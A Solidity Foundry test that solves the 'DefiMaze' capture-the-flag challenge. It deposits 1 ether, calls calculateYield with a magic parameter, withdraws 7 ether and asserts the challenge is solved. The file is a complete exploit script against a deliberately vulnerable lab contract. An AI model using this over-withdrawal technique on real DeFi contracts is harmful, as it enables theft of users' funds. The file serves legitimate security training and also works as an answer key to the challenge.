// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SetUp,Vault,DeFiPlatform} from "../lib/ctf/DefiMaze/contracts/SetUp.sol";

contract DefiMazeTest is Test {
    SetUp private deployer;

    function setUp() external {
        deployer = new SetUp();

    }

    function test_hackDefiMaze() external {
    DeFiPlatform platform = deployer.platfrom();

     platform.depositFunds{value: 1 ether} (1 ether);
     platform.calculateYield(114514,0,0);
     platform.requestWithdrawal(7 ether);
     deployer.vault().isSolved();

     assertTrue(deployer.isSolved());

    }
}